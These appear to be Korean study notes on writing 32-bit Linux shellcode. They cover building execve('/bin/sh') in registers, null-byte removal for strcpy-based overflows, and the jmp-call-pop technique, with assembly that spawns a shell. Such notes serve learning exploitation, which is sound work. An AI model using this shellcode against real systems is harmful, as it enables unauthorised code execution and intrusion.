- execve함수
```c
char *argv[2];
argv[0] = "/bin/sh";
argv[1] = NULL;
execve(argv[0],argv,NULL);
//execve(/bin/sh,/bin/sh+NULL,NULL)
```

- strcpy단점: NULL값을 만나면 멈춘다. 따라서 copy하려고하는 '머신코드'에 NULL이 있으면 안된다(공격하기 위해서)
- 레지스터에 들어가는 값
	- eax = execve주소
	- ebx = /bin/sh
	- ecx = argv배열의 시작 주소
	- edx = 0 (=>strcpy에 못들어가서 xor로 변형)
- 스택에 들어가는 순서
	- edx->ecx->ebx->eax
- al: eax 하위 1바이트
- **0없애는 방법**
	- **xor**
	- **bit shift left and bit shift right**
- **shell code 작성법**
	- **레지스터로**
	- **jmp-call-pop**
- jmp-call-pop:코드 세그먼트 내에 문자열을 포함시키고 그 주소를 동적으로 알아내는 방식
	- --omagic:코드 영역에 쓰기 권한을 부여
	- two에서 call을 하면 다음 실행할 명령인 `db /bin/sh`를 리턴주로 정한다음 스택에 넣고 one으로 넘어간다
	- one에 들어가자마자 `db /bin/sh`인 리턴주소를 pop하기 때문에 ebx에는 `/bin/sh*AAAABBBB`가 들어간다

## Shell Code 작성
### 순서
1. /bin/sh: ebx
2. argv: ecx
3. 0: edx
4. execve: eax

### 1. /bin/sh
```asm
xor eax,eax ;\0설정
push eax ;\0
push "//sh" ;//sh\0
push "/bin" ;/bin//sh\0
mov ebx,esp ; ebx에 "/bin//sh\0" 저장
```
- \0 -> //sh -> /bin 순서로 push
### 2. argv
```asm
push eax ;argv[0]
push ebx ;argv[1]
mov ecx,esp ;ecx에 argv[0],argv[1] 저장
```
- `argv[0]` -> `argv[1]` 순서로 push
### 3. edx
```asm
xor edx,edx ;edx에 0저장
```
- edx에 xor연산으로 0저장
### 4. execve
```asm
xor eax, eax ;eax = 0x00000000
mov al,0x0b ;al=eax하위 1바이트->eax=0x0000000b
int 0x80 ;system call 인터럽트
```


## 0제거
1. xor연산
2. mov al,0x99 사용
	1. mov eax,0x99: 0x99는 실제로 0x00000099이기 때문에 0이 들어간다
3. shift left x bit -> shift right x bit

### /bin/bash
- `h***`를 shift left -> shift right 해서 `\0\0\0h`로 만든 다음 push
- /bas -> /bin 순서로 넣으면 /bin/bash 
```asm
mov edx, "h***"
shl edx,24
shr edx, 24
push edx
push "/bas"
push "/bin"
mov ebx, esp
```

### db로 /bin/sh 넣기
### 순서
1. two 진입
2. 바로 one call
3. one에서 pop ebx를 하면 two로 되돌아갈 return 주소가 없어짐
4. return 주소에 db '/bin/sh*AAAABBBB'를 셸 코드 실행